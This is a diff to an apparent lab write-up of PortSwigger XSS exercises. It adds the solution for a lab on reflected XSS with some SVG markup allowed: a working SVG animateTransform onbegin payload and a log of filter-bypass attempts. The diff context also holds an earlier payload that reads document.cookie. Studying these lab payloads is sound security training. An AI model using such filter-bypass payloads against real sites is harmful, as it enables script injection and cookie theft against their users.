@@ -21,6 +21,7 @@ Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to 
 | 14 | Stored DOM XSS | XSS | ✅ Solved |
 | 15 | Reflected XSS into HTML context with most tags and attributes blocked | XSS | ✅ Solved |
 | 16 | Reflected XSS into HTML context with all tags blocked except custom ones | XSS | ✅ Solved |
+| 17 | Reflected XSS with some SVG markup allowed | XSS | ✅ Solved |
 
 ## Key Techniques
 
@@ -199,6 +200,32 @@ Payload: <script>location = 'https://<LAB_ID>.web-security-academy.net/?search=%
 Decoded payload in search parameter:
 ```html
 <xss autofocus tabindex="0" onfocus="alert(document.cookie)"></xss>
+```
+
+**Lab 17 - Reflected XSS with some SVG markup allowed**
+SVG animation tags like `<animateTransform>` bypass standard WAF filters because they're specialized SVG elements. The onbegin event fires automatically when the animation element is created/parsed, without requiring user interaction or explicit animation triggers. By nesting `<animateTransform>` inside an SVG container (`<svg>` and `<rect>`), the event fires immediately on page load, executing arbitrary code.
+```
+Payload: <svg><rect width="100" height="100"><animateTransform onbegin="alert('xss')"></animateTransform></rect></svg>
+```
+**Methodology**
+```
+Hypothesis 1: <image src="x" onerror="alert(1)"></image>
+Result: event is not allowed.
+
+Hypothesis 2: <svg onload="alert()"></svg> 
+Result: failed because this event isn't allowed. So we can't use onload.
+
+Hypothesis 3: <svg onactivate="alert()"></svg>
+Result: Event is not allowed
+
+Hypothesis 4: <svg onbegin="alert()"></svg>
+Result: not executed but pass through
+
+Hypothesis 5: <svg><animate onbegin="alert()></animate></svg>
+Result: animate is not allowed
+
+Hypothesis 6: <svg><rect width="100" height="100"><animateTransform onbegin="alert('xss')"></animateTransform></rect> </svg>
+Result: ✅ Alert executed
 ```
 
 ## Disclaimer
